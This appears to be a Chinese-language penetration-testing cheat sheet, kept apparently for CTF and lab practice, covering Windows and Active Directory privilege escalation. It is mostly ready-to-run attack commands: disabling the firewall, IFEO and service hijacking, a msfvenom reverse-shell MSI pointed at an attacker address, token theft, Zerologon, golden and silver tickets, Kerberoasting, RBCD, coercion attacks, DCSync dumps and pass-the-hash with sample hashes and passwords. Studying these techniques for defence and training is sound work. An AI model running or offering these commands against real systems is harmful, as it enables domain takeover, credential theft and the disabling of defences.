```bash
# 杀进程
taskkill /pid <PID> /f

# 关防火墙
netsh advfirewall set allprofiles state off
```

# 扫描工具

### winPEAS（Windows提权扫描工具）

在运行之前，我们需要添加一个注册表项，然后重新打开命令提示：

```bash
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

运行所有检查，同时避免耗时的搜索：

```bash
.\winPEASany.exe quiet cmd fast
```

运行特定检查类别：

```bash
.\winPEASany.exe quiet cmd systeminfo
```

### linpeas （linux提权扫描工具）

```bash
linpeas -a
```

# Windows权限提升

## 文章

[手把手教你Windows提权 - FreeBuf网络安全行业门户](F:\LocalCTF\手把手教你Windows提权 - FreeBuf网络安全行业门户.pdf)

## SYSTEM提权

### IFEO映像劫持

**文章**

[IFEO映像劫持在实战中的使用 - 知乎](F:\LocalCTF\IFEO映像劫持在实战中的使用 - 知乎.html)

查看权限

```bash
get-acl -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" | fl *
```

![image-20231005001002988](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231005001002988.png)

这里我们发现所有正常登录的用户都可以修改注册表，利用这个性质，修改注册表映像劫持，使用放大镜进行提权，其实也就是把本来用户主页点放大镜启动的magnify.exe替换成C:\windows\system32\cmd.exe，这样就直接提权成system了

```bash
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
```

更多如下

- 屏幕键盘： C:\Windows\System32\osk.exe
- 放大镜： C:\Windows\System32\Magnify.exe
- 旁白： C:\Windows\System32\Narrator.exe
- 显示切换器 C:\Windows\System32\DisplaySwitch.exe
- 应用切换器： C:\Windows\System32\AtBroker.exe
- 粘贴键（开始菜单锁定用户, 然后连按五次 shift）：Options\sethc.exe

然后点左下角的头像锁屏

![image-20231005001143702](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231005001143702.png)

进主页点右下角的放大镜

![image-20231005001201203](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231005001201203.png)

直接就system权限了

![image-20231005001214973](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231005001214973.png)

### 服务劫持

#### sc基本命令

查询服务的配置：

```bash
sc.exe qc <name>
```

查询服务的当前状态：

```bash
sc.exe query <name>
```

修改服务的配置选项：

```bash
sc.exe config <name> <option>= <value> # = 后必须带空格
```

开始/停止服务：

```bash
net start/stop <name>
```

#### 方法一（修改注册表）

使用`accesschk.exe`查找对注册表的权限

```bash
accesschk.exe /accepteula -uvwqk "Authenticated Users" HKLM\SYSTEM\CurrentControlSet\Services
```

```bash
accesschk.exe /accepteula -uwcqv "Authenticated Users" gupdate # 查看对该服务是否有重启权限
```

使用powershell的`Get-Acl`查找注册表权限

```powershell
# 找有写权限, 并且用户也可以启动和停止服务 Allow FullControl
Get-Acl -Path hklm:\System\CurrentControlSet\services\* | select Path,AccessToString | Format-List > 1.txt

# 查看对该注册表的权限
Get-Acl -Path hklm:\System\CurrentControlSet\services\gupdate | fl 
```

修改服务

```bash
reg add "HKLM\SYSTEM\CurrentControlSet\Services\gupdate" /t REG_EXPAND_SZ /v ImagePath /d "cmd.exe /k C:\Users\Public\reverse_tcp.exe" /f
```

启动服务

```bash
sc start gupdate
```

#### 方法二

```bash
accesschk.exe /accepteula -uwcqv "Authenticated Users" *   # 枚举目标主机"Authenticated Users"组对服务的权限
accesschk.exe /accepteula -uwcqv "INTERACTIVE" *  # 枚举目标主机"INTERACTIVE"组对服务的权限
```

将该服务的启动时执行的二进制文件替换为预先上传的攻击载荷

```bash
sc config gupdate binpath= "cmd.exe /k C:\Users\Public\reverse_tcp.exe" # "="后面必须有空格
```

如果有关闭和开启该服务的权限则直接关闭和开启该服务

```bash
sc stop gupdate
sc start gupdate
```

如果没有，则重启系统

```bash
shutdonw -r -t 0
```

#### 方法三（服务路径权限可控）

使用`accesschk.exe`查看`InsexeSvc`这个服务的二进制文件所在目录是否有写入的权限

```bash
accesschk.exe /accepteula -quv "C:\Program Files\Insecure Executables\"
```

将该服务重命名

```bash
cp InsexeSvc.exe InsexeSvc.exe.bak
或者
ren InsexeSvc.exe InsexeSvc.exe.bak
```

在该路径传入恶意攻击载荷

如果有关闭和开启该服务的权限则直接关闭和开启该服务

```bash
sc stop gupdate
sc start gupdate
```

如果没有，则重启系统

```bash
shutdonw -r -t 0
```

#### 方法四（未引用的服务路径）

例如 `binpath`为`C:\Program Files\Sub Dir\Program Naem.exe`，则系统会依次去执行以下程序：`C:\Program.exe` `C:\Program Files\Sub.exe` `C:\Program Files\Sub Dir\Program.exe` `C:\Program Files\Sub Dir\Program Naem.exe`

如果我们对`C:\Program Files\Sub Dir\`有可写权限，则可以进行服务劫持

枚举存在该漏洞的服务(在`cmd.exe`下执行)

```bash
wmic service get DisplayName,PathName,StartMode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

检测是否有可写权限

```bash
accesschk.exe /accepteula -quv "C:\Program Files\"
```

在`C:\Program Files\` 传入恶意文件 `Sub.exe`

服务再次启动后，就会先启动我们的恶意文件

### MSI安装策略提权

MSI安装策略提权是由于用户在配置MSI安装策略时，启用了“永远以高特权进行安装”（`AlwaysInstallElevated`，默认禁用），使得任何权限的用户都可以通过SYSTEM权限安装MSI程序。此时，可以在目标主机上安装一个预先制作的恶意MSI文件，以获得SYSTEM权限。

查看注册表来判断是否开启了`AlwaysInstallElevated`，开启后值都为`0x1`

```bash
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

使用`msf`来创建恶意MSI

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.100.10 lport=4444 -f msi -o eval.msi
```

执行MSI

```bash
msiexec /quiet /qu /i eval.msi
# /quiet    在安装期间禁止向用户发送任何消息
# /qu     无GUi
# /i     常规安装
```

### SeRestorePrivilege权限滥用

```bash
# 查看用户权限
whoami /priv 
```

若用户有 `SeRestorePrivilege`权限，则可以任意修改注册表以及文件，可以用`IFEO映像劫持`等进行提权

这里我们通过修改文件名来提权

```bash
cd c:\\Windows\\system32
ren sethc.exe sethc.bak
ren cmd.exe sethc.exe
```

之后锁定用户，按5次shift便可以提权

### 令牌窃取

**条件**：一般需要用户具有`SeImpersonatePrivilege`和`SeAssignPrimaryToken` / `SeIncreaseQuotaPrivilege` 提权，而这两个提权一般为系统管理员、网络管理员和系统服务账户（如IIS、MSSQL等）

 #### SharpToken进行令牌窃取

[SharpToken](F:\ctfTools\SharpToken-访问令牌窃取工具)

#### MSF进行令牌窃取

```bash
load incognito # 加载incognito模块
list_tokens -u # 列出所有访问令牌
impersonate_token "NT AUTHORITY\SYSTEM" # 窃取 NT AUTHORITY\SYSTEM 用户的令牌
steal_token <PID> # 从指定的进程窃取令牌
```

### Potato家族提权

#### SweetPotato

工具 https://github.com/uknowsec/SweetPotato

基本用法：

将工具上传至靶机，执行如下命令，可以以system权限执行命令，或者反弹shell

```bash
sweetpotato.exe -a whoami
```

#### God Potato

适用最新的windows版本

#### Ladon

[Ladon](F:\ctfTools\Ladon-大型内网渗透工具\Ladon911)

直接使用Ladon来使用Potato提权即可，效果更佳

```bash
Ladon SweetPotato whoami
Ladon GodPotato whoami
```

### 枚举Unattended凭据

无人值守（Unattended）安装允许应用程序在不需要管理员关注下自动安装。无人值守安装的问题是会在系统中残留一些配置文件，其中可能包含本地管理员的用户名和密码。

常见目录

```bash
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\Windows\system32\sysprep.inf
c:\windows\system32\sysprep\sysprep.xml
c:\unattend.xml
c:\windows\Panther\Unattend.xml
c:\Windows\Panther\Unattended.xml
c:\windows\Panther\Unattend\unattended.xml
c:\windows\Panther\Unattend\Unattend.xml
c:\windows\System32\Sysprep\Unattend.xml
c:\windows\System32\Sysprep\Panther\Unattend.xml
```

#### MSF模块

`MSF`中提供了 `post/windows/ghther/enum_unattend` 模块，可以从`Unattend`配置文件中自动化检出密码

### 获取组策略凭据

在大型的企业或组织的域环境中，网络管理员往往会通过下方组策略的方式对所有加入域的计算机的本地管理员进行批量修改。在新建一个组策略后，域控制器会自动在SYSVOL共享目录中生成一个XML文件，该文件保存了组策略更新后的密码。SYSVOl是安装活动目录时创建的一个用于存储公共文件服务器副本的共享文件夹，主要存放登录脚本、组策略数据以及其他域控制器需要的域信息等，并在所有经过身份认证的域用户或者域信任用户范围内共享。
通过`net share`可以看到这个SYSVOl目录。

在SYSVOL目录中，有一个Groups.xml文件，其中的cpassword字段保存了经过AES256算法加密后的密码，但是这个加密私钥在2012年被微软公开了。因此任意经过认证的用户都可以读取保存在xml文件的密码。

```bash
\\<DC-IP>\sysvol\<Domian>\Policies\{……}\...\Groups.xml
```

#### MSF模块

`MSF` 中内置了 `post/windows/gather/credentials/gpp` 模块，可以自动化搜索位于SYSVOL共享目录的XML，并从中解出密码。

### HiveNightmare (CVE-2021-36934)

[HiveNightmare](F:\ctfTools\HiveNightmare(CVE-2021-36934)-Winodws提权)

由于ACL过于宽松，导致可以从系统卷影副本副本中读取包括 **SAM**、**SYSTEM**、**SECURITY** 在内的多个系统文件。直接获得管理员用户哈希。

适用范围：Windows 10 Version 1809发布以来的所有Windows版本，包括Winodws11。

适用条件：已启用系统保护、系统上存在创建的系统还原点、系统启动本地管理员用户

检测是否有权限

```bash
icacls c:\windows\system32\config\SAM
icacls c:\windows\system32\conifg\SECURITY
icacls c:\windows\system32\conifg\SYSTEM
```

若输出 "BUILTIN\Users:(I)(RX)"，则易受攻击

直接使用工具提取

```bash
HiveNightmare.exe
```

通过`secretsdump`导出SAM文件的用户哈希

```bash
python secretsdump.py -sam SAM -system SYSTEM -security SECURITY local
```

之后要么进行哈希破解或者横向移动

## 域控提权

### Kerberos攻击分类

- **AS_REQ & AS_REP 阶段**
  - **域内用户枚举**
  - **密码喷洒攻击**
  - **AS-REP Roasting攻击**
  - **黄金票据**
- **TGS_REQ & TGS_REP阶段**
  - **Kerberosast 攻击**
  - **白银票据**
  - **委派攻击**
    - **非约束委派**
    - **S4U协议**
      - **约束委派**
      - **基于资源的约束委派**
- **PAC安全问题**
  - **MS14-068**
  - **NoPac （CVE-2021-42278 & CVE-2021-42287）**

### Zerologon域内提权（CVE-2020-1472）

Netlogon远程协议的一个提权提升漏洞，可以在不提供任何凭据的情况下通过身份验证，并实现域内提权。即通过重置域控的机器用户的密码，来利用机器用户来DCSync导出域管理员密码，进而获取域控权限。

#### 获取域控机器账号

```bash
Nslookup -type=SRV _ldap._tcp
```

#### 方法一（Mimikatz内置利用模块）

探测是否有该漏洞

```bash
mimikatz.exe "privilege::debug" "lsadump::zerologon /target:<DC-IP> /account:<DC-机器账户>" "exit"
```

重置密码

回显两个OK显示成功把密码置零，因为机器用户是不可以登录系统的，但是域控的机器用户具备Dcsync特权，我们就可以滥用该特权来进行Dcsync攻击

```bash
mimikatz.exe "privilege::debug" "lsadump::zerologon /target:<DC-IP> /ntlm /null /account:<DC-机器账户> /exploit" exit
```

使用Mimikatz来进行Dcsync并获取域管理员帐户的哈希

```bash
mimikatz.exe "privilege::debug" "lsadump::dcsync /dc:<DC-域名> /authuser:<DC-机器用户> /authdomain:<域名> /authpassword: /domain:<域名> /authntlm /user:administrator" "exit"
```

哈希注入起一个域管cmd

```bash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:<域名> /ntlm:<哈希>" "exit"
```

通过域管cmd，恢复域控机器账户密码

```bash
mimikatz.exe "privilege::debug" "lsadump::postzerologon /target:<DC-IP> /account:<DC-机器账户>" "exit"
```

#### 方法二（使用脚本）

重置密码

```bash
python zerologon_tester.py <dc-name> <dc-ip>
# python zerologon_tester.py DC-1 10.10.10.11
```

使用`secretsdump.py`以空密码连接域控，并导出域管理员的哈希

```bash
python secretsdump.py hack_my.com/DC-1\$@10.10.10.11 -just-dc-user "hack-my\administrator" -no-pass
```

恢复域控密码

在域控执行以下命令，导出本地注册表的值

```
reg save HKLM\SYSTEM system
reg save HKLM\SAm sam
reg save HKLM\SECURITY security
```

使用`secretsdump.py`导出注册表中的哈希值。`plain_passwprd_hex` 即为机器用户未重置前的密码（hex编码）

```bash
python secretsdump.py -sam sam -system system -security security local
```

通过`restorepassword.py`恢复域控机器用户的密码

```bash
python restorepassword.py testsegment/s2016dc@s2016dc -target-ip 192.168.222.113 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3...etc
```

### AS-REP Roasting

保存为user.txt然后枚举未设置预认证的账号（这个东西默认是不关闭的，但当关闭了预身份验证后，攻击者可以使用指定用户向域控制器的Kerberos 88端口请求票据，此时域控不会进行任何验证就将TGT和该用户Hash加密的Login Session Key 返回。因此，攻击者就可以对获取到的用户Hash加密的 Login Session Key 进行离线破解，如果字典够强大，则可能破解得到该指定用户的明文密码）

```bash
# 这个脚本会尝试获得并列出不需要Kerberos域认证(UF_DONT_REQUIRE_PREAUTH)的用户，输出和JtR兼容。
proxychains4 python3 GetNPUsers.py -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/
```

不需要枚举的话，也可以使用如下工具

```bash
.\Rubeus.exe asreproast /user:USER /domain:DOMIAN /dc:DOAMIN-CON 
```

### 黄金票据攻击

TGT 为 krbtgt 的 NTLM 哈希值加密生成的，如果获取 krbtgt 的哈希值，便可以伪造任意用户。

攻击需要以下信息：域名、域 SID、krbtgt 哈希值、伪造的用户

#### 导出 krbtgt 的 NTLM Hash

在 mimikatz 下执行以下命令

```bash
mimikatz.exe "lsadump::dcsync /domain:teamssix.com /user:krbtgt" exit
```

这里得到 krbtgt 的 NTLM Hash 为 d685b9c4fa2d318a9943ed68948af087

该命令使用的 dcsync 功能远程转储 AD 里的 ntds.dit，使用 /user 参数，可以只导出指定用户的值。

或者使用以下命令获取 krbtgt 的 NTLM Hash ，域 SID 值，但该命令无法获取 AES-256 的值

```bash
mimikatz.exe "privilege::debug" "lsadump::lsa /patch /user:krbtgt"
mimikatz.exe "privilege::debug" "lsadump::lsa /patch " # 获取所有用户的信息
```

#### 获取基本信息

获取域 SID

```bash
wmic useraccount get name,sid
```

这里得到 administrator 的 SID 为 S-1-5-21-284927032-1122706408-2778656994-500，即表示当前域的 SID 就是 S-1-5-21-284927032-1122706408-2778656994

获取当前用户的 SID

```bash
whoami /user
```

查询域管理员账号

```bash
net group "domain admins" /domain
```

查询域名

```bash
ipconfig /all
```

#### 制作黄金票据

先将票据清空

```bash
mimikatz.exe "kerberos::purge" exit
```

生成票据

```bash
mimikatz.exe "kerberos::golden /admin:Administrator /domain:teamssix.com /sid:S-1-5-21-284927032-1122706408-2778656994 /krbtgt:d685b9c4fa2d318a9943ed68948af087 /ticket:Administrator.kiribi" exit
```

传递票据并注入内存

```bash
mimikatz.exe "kerberos::ptt Administrator.kiribi"
```

### Kerberoasting

在识别到域内的机器和域控时，一种提权方式是Kerberoasting。

> 什么是Kerberoasting？

在域环境中为用户配置环境时，比如一些数据库服务，这时候会用到SPN(服务主体名称)，它将服务和账户关联起来，用户访问特定的资源文件时，会收到这个账户ntml hash签名的Kerberos 票据。

我们拿到这个票据后可以直接离线破解。
关于这个的工具文末的参考链接中有介绍，但是用自己习惯的就好了。
[GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)比较简单。

```bash
# 这个脚本会找出和普通用户账户关联的SPN，输出格式与JtR和hashcat兼容
python GetUserSPNs.py -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf
```

### 制作白银票据

制作白银票据，就是制作TGS（ST）。如果不做PAC认证，就可以访问特定的服务。

#### 制作CIFS服务票据

得到了 OWA2010SP3$ 的哈希值，通过`mimikatz`生成`CIFS`服务的银票，从而可以实现完全的远程文件访问等。

```bash
mimikatz.exe "kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:cifs /rc4:125445ed1d553393cce9585e64e3fa07 /user:silver /ptt" exit

# 参数说明：
/domain：当前域名称
/sid：SID值，和金票一样取前面一部分
/target：目标主机，这里是OWA2010SP3.0day.org
/service：服务名称，这里需要访问共享文件，所以是cifs
/rc4：目标主机的HASH值
/user：伪造的用户名
/ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入
```

使用`dir \\OWA2010SP3.0day.org\c$`访问DC的共享文件夹。

#### 制作LDAP服务票据

```bash
mimikatz.exe "kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:ldap /rc4:125445ed1d553393cce9585e64e3fa07 /user:silver /ptt" exit
```

再通过DCSync导出任意用户的哈希

例如导出 `krbtgt` 的哈希来制作黄金票据

```bash
mimikatz.exe "lsadump::dcsync /domain:hack-my.com /user:krbtgt"
```

### SIDHistory

户滥用了SID历史功能(SIDHistory是一个为支持域迁移方案而设置的属性，当一个对象从一个域迁移到另一个域时，会在新域创建一个新的SID作为该对象的objectSid，在之前域中的SID会添加到该对象的sIDHistory属性中，此时该对象将保留在原来域的SID对应的访问权限)

![13-2](F:\LocalCTF\pictures\13-2.png)

我们就可以通过这个滥用直接攻击DC了，因为我们保留域管理员的访问权限了，所以直接dump哈希

```bash
mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /all /csv" "exit"
```

### 自动登录凭据收集

```bash
query user # 查看在线用户
```

```bash
# 尝试抓取自动登录凭据
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### 委派关系检测

[findDelegation.py](F:\ctfTools\impacket\examples\findDelegation.py)

```bash
python3 findDelegation.py xiaorang.lab/'WIN19$' -hashes :2c05ad434d747b203a57565194891b38 -dc-ip 172.22.4.7
```

### RBCD

[域渗透之委派攻击详解（非约束委派_约束委派_资源委派）-腾讯云开发者社区-腾讯云](F:\LocalCTF\域渗透之委派攻击详解（非约束委派_约束委派_资源委派）-腾讯云开发者社区-腾讯云.html)

[域渗透之委派攻击全集 - 知乎](F:\LocalCTF\域渗透之委派攻击全集 - 知乎.html)

[基于资源的约束委派 (RBCD) 利用总结 - X1r0z Blog](F:\LocalCTF\基于资源的约束委派 (RBCD) 利用总结 - X1r0z Blog.html)

#### 基于资源的约束委派攻击本地提权

查询机器用户被哪些账户加入到域内，会显示相应的SID

```bash
AdFind.exe -h 10.150.127.166 -b "DC=haishi,DC=com" -f "objectClass=computer" mS-DS-CreatorSID
```

通过`sid2user`找到对应的用户

```text
sid2user.exe \\10.150.127.166 5 21 1400638014 602433399 2258725660 1146
```

创建一个机器用户

```bash
proxychains impacket-addcomputer xiaorang.lab/lixiuying:'winniethepooh' -dc-ip 172.22.15.13 -dc-host xiaorang.lab -computer-name 'TEST$' -computer-pass 'P@ssw0rd'
```

修改服务资源 msDS-AllowedToActOnBehalfOfOtherIdentity 属性

```bash
proxychains impacket-rbcd xiaorang.lab/lixiuying:'winniethepooh' -dc-ip 172.22.15.13 -action write -delegate-to 'XR-0687$' -delegate-from 'TEST$'
```

请求ST

```bash
proxychains impacket-getST xiaorang.lab/'TEST$':'P@ssw0rd' -spn cifs/XR-0687.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13
```

注入票据

```bash
export KRB5CCNAME=Administrator.ccache
或者 windows上可以用mimikatz 将票据注入内存
mimikatz.exe "kerberos::ptc administrator.ccache" exit
```

`psexec`横移

```bash
proxychains impacket-psexec administrator@XR-0687.xiaorang.lab -k -no-pass -dc-ip 172.22.15.13
```

#### 利用方式2 Acount Operators组用户拿下主机

如果获得Acount Operators组用户就可以获得域内除了域控的所有主机权限

Acount Operators组成员可以修改域内除了域控其他所有主机的`msDS-AllowedToActOnBehalfOfOtherIdentity`属性

**查询Acount Operators组成员**

```text
adfind.exe -h 10.150.127.166:389 -s subtree -b CN="Account Operators",CN=Builtin,DC=haishi,DC=haishi,DC=com member
```

之后便是一样，只是我们可以修改任意除域控外的机器用户。

#### 利用方式3：结合NTLM Relay接管域控（CVE-2019-1040）



### 约束委派

**如果我们可以攻破配置约束委派的服务账户(获取密码/Hash)，我们就可以模拟域内任意用户(如 domain\administrator) 并代表其获得对已配置服务的访问权限（获取 TGS 票据）。**

此外，我们不仅可以访问约束委派配置中用户可以模拟的服务，**还可以访问使用与模拟帐户权限允许的任何服务。**（因为未检查 SPN，只检查权限）。比如，如果我们能够访问 CIFS 服务，那么同样有权限访问 HOST 服务。注意如果我们有权限访问到 DC 的 LDAP 服务，则有足够的权限去执行 DCSync。

使用 Adfind **查询约束委派的用户**

```bash
AdFind.exe -h 10.10.10.8 -u redteam-iis -up Server12345 -b "DC=redteam,DC=red" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto
```

#### S4U 伪造高权限 ST 拿下域控

先清空内存票据

```bash
 # 清空内存票据
 kerberos::purge
 # 查看内存中的票据
 kerberos::list
```

假如某个用户配置了到域控的约束委派，这里以MSSQLSERVER$ 举例, 可以通过 S4U 伪造高权限 ST 拿下域控

用 [Rubeus](E:\ctfTools\Ghostpack-CompiledBinaries\dotnet v4.7.2 compiled binaries\Rubeus.exe) 申请访问自身的服务票据

```bash
.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:1400900feabf5d233a9c1ec534105274 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap
```

抓到后注入票据

```bash
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:你上面抓到的服务票据     # /msdsspn要看配置了何种服务的约束委派
```

然后就拿到域控直接读取flag即可

```bash
type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt
```

### 非约束委派

#### 文章 

[奇安信攻防社区-红队域渗透NTLM Relay：强制认证方式总结](F:\LocalCTF\奇安信攻防社区-红队域渗透NTLM Relay：强制认证方式总结.html)

| Coerce       | SMB named pipe    | Protocol | API / Methods                                                |
| :----------- | :---------------- | :------- | :----------------------------------------------------------- |
| PrinterBug   | \PIPE\spoolss     | MS-RPRN  | RpcRemoteFindFirstPrinterChangeNotificationEx                |
| PeitiPotam   | \PIPE\lsarpc      | MS-EFSR  | EfsRpcOpenFileRaw EfsRpcEncryptFileSrv EfsRpcDecryptFileSrv EfsRpcQueryUsersOnFile EfsRpcQueryRecoveryAgents EfsRpcFileKeyInfo |
| DFSCoerce    | \pipe\netdfs      | MS-DFSNM | NetrDfsRemoveStdRoot NetrDfsAddStdRoot                       |
| ShadowCoerce | \pipe\FssagentRpc | MS-FSRVP | IsPathSupported IsPathSupported                              |
| PrivExchange |                   |          | PushSubscription                                             |

在域内机器查找非约束委派用户的命令

```bash
AdFind.exe -b "DC=redteam,DC=com" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName
```

#### PrinterBug

**条件**：

- 打印服务开启 - spoolsv.exe
- 拥有一个域用户凭据信息

非约束委派利用的前提是必须通过域管来远程连接,在实战中通过域管来连接的情况是几乎不存在的，比较鸡肋，因此可以通过Spooler打印服务来强制指定的主机进行连接,来达到我们想要的效果。

`sc` 查询 `spooler` 是否开启

```bash
sc query spooler
```

通过win7的`本地管理员`权限运行rubeus.exe进行监听

```bash
Rubeus.exe monitor /interval:5 /filteruser:DC$

# /interval:5 设置监听间隔5秒
# /filteruser 监听对象为我们的域控，注意后面有个$，如果不设置监听对象就监听所有的TGT
```

然后通过spoolsample.exe强制dc向win7机器进行身份验证，rubeus就会监听到base64编码后的TGT

```bash
SpoolSample.exe DC WIN7-PC
```

或者还可以使用 `printerbug.py`

通过rubeus导入票据

```bash
rubeus.exe ptt /ticket:<ticket>
```

通过mimikatz可导出域中所有用户的hash

```bash
mimikatz.exe "lsadump::dcsync /domain:ccc1.test /all /csv" exit
```

#### PetitPotam

**条件：**

- 目标支持 MS-EFSR 协议
- 拥有一个域用户凭据信息

Rubeus.exe需要`管理员`权限

[Rubeus.exe](F:\ctfTools\Ghostpack-CompiledBinaries\Rubeus.exe)

```bash
Rubeus.exe monitor /interval:1 /filteruser:DC01$
```

[petitpotam.py](F:\ctfTools\PetitPotam\petitpotam.py)

```bash
python PetitPotam.py -u 'WIN19$' -hashes :2c05ad434d747b203a57565194891b38 -d xiaorang.lab -dc-ip 172.22.4.7 WIN19.xiaorang.lab DC01.xiaorang.lab
```

获取`DC01$` 的 TGT

![202308091657142](F:\LocalCTF\pictures\202308091657142.png)

导入 TGT 然后 DCSync

```bash
Rubeus.exe ptt /ticket:xxx
mimikatz.exe "lsadump::dcsync /all /csv"
```

#### DFSCoerce

**条件：**

- 域内启用 MS-DFSNM 协议
- 拥有一个域用户凭据信息
- 只对域控有效

管理员权限运行Rubeus

```bash
Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$
```

使用 DFSCoerce 漏洞利用工具，触发辅域控进行强制验证

[dfscoerce.py](F:\ctfTools\DFSCoerce\dfscoerce.py)

```bash
python dfscoerce.py -u win19$ -hashes "aad3b435b51404eeaad3b435b51404ee:21b11500d5834a2b9b3373564a0565f6" -d xiaorang.lab win19 172.22.4.7
```

获取`DC01$` 的 TGT

![202308091657142](F:\LocalCTF\pictures\202308091657142.png)

导入 TGT 然后 DCSync

```bash
Rubeus.exe ptt /ticket:xxx
mimikatz.exe "lsadump::dcsync /all /csv"
```

#### ShadowCoerce

**条件**

- 目标服务器安装了文件服务器VSS代理服务
- 开启MS-FSRVP协议
- 拥有一个域用户凭据信息

管理员权限运行Rubeus

```bash
Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$
```

使用 shadowcoerce 漏洞利用工具，触发强制验证

```bash
python shadowcoerce.py -u spiderman -p 123.com -d hack.lab 20.20.20.100 20.20.20.6
```

导入 TGT 然后 DCSync

```bash
Rubeus.exe ptt /ticket:xxx
mimikatz.exe "lsadump::dcsync /all /csv"
```

#### PrivExchange

在Exchange中，提供了网络服务API - PushSubscription，允许订阅推送通知。Exchange服务器在域中通常有很高的权限（WriteDacl，修改目标ACL的权限），是攻击的不戳目标。

攻击者可以利用该API迫使Exchange服务器对指定目标进行强制认证。

**条件：**

- 目标为Exchange，且未打补丁
- 拥有一个带有邮箱的域用户凭据信息

管理员权限运行Rubeus

```bash
Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$
```

使用 privexchange 漏洞利用工具，触发强制验证

```bash
python privexchange.py -u spiderman -p 123.com -d hack.lab -ah 20.20.20.100 20.20.20.7
```

导入 TGT 然后 DCSync

```bash
Rubeus.exe ptt /ticket:xxx
mimikatz.exe "lsadump::dcsync /all /csv"
```

#### 集成工具推荐 - Coercer

### 工具使用

分析目标服务器可利用的接口，使用 --analyze 参数

```shell
python Coercer.py -u spiderman -p 123.com -d hack.lab -l 20.20.20.100 -t 20.20.20.6 --analyze
```

PS：加 -v 可以显示更加详细的信息

![image-20231025204907688](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231025204907688.png)

执行强制验证攻击，默认先使用了 MS-EFSR::EfsRpcOpenFileRaw 方法

```shell
python Coercer.py -u spiderman -p 123.com -d hack.lab -l 20.20.20.100 -t 20.20.20.6
```

![image-20231025204916149](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231025204916149.png)

### DCSync攻击

DCSync 的原理非常清晰，利用**域控制器之间的数据同步复制**。

- 发现网络中的目标域控制器;
- 通过 DRS 服务的 GetNCChanges 接口发起数据同步请求，Directory Replication Service (DRS) Remote Protocol

Samba wiki 关于 GetNCChanges 的描述包括:

当一个 DC (客户端 DC)想从其他 DC (服务端 DC)获取数据时，客户端 DC 会向服务端 DC 发起一个 GetNCChanges 请求。回应的数据包括需要同步的数据。

如果需要同步的数据比较多，则会重复上述过程。毕竟每次回应的数据有限。

**DCSync攻击前提**

一个用户想发起 DCSync 攻击，必须获得以下任一用户的权限：

- Administrators组内的用户
- Domain Admins组内的用户
- Enterprise Admins组内的用户
- 域控制器的计算机帐户

即：默认情况下域管理员组具有该权限。

**DCSync攻击利用**

使用mimikatz，导出域内所有用户的hash

```bash
C:\\Users\\Aldrich\\Desktop\\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:WIN2016$ /domain:xiaorang.lab /ntlm:抓到的机器账户哈希" "exit"

C:\\Users\\Aldrich\\Desktop\\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:xiaorang.lab /all /csv" "exit"

load kiwi
kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
```

拿到了Administrator的hash

**哈希传递**

直接通过哈希传递就能拿下域控，这里使用**crackmapexec来进行PTH**,拿到最后一部分flag

```bash
proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
```

也可以是要**msf的psexec模块**进行哈希传递

```bash
msf > use  exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > set lhost 192.168.10.27
msf exploit(psexec) > set rhost 192.168.10.14
msf exploit(psexec) > set smbuser Administrator
msf exploit(psexec) > set smbdomain xiaorang
msf exploit(psexec) > set smbpass 815A3D91F923441FAAD3B435B51404EE:A86D277D2BCD8C8184B01AC21B6985F6   #这里LM和NTLM我们已经获取到了
msf exploit(psexec) > exploit
```

**mimikatz进行哈希传递攻击PtH**

```bash
kiwi_cmd "privilege::debug"    #先提权
#使用administrator用户的NTLM哈希值进行攻击
